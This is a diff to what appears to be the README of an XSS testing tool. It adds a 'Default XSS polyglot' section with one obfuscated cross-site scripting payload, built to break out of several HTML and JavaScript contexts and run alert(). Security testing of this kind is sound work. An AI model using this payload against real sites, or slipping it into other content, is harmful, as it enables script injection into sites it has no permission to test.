@@ -71,6 +71,12 @@ You can test them all by running the following commands.
 python xpt.py --mode test
 ~~~
 
+## Default XSS polyglot
+
+~~~html
+jaVaSCriPt:/*\\x3csvG/oNloAd=alert()\\x3e*/alert()//</stYle/</tiTle/</texTarEa/</scrIpt/--!><sVg//*`/*\"/*'/**/(_=alert())//\\%0a;alert()//'/oNlOad=alert() OncLick=alert()//>;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoKT4K
+~~~
+
 ## Contexts
 
 Available contexts:
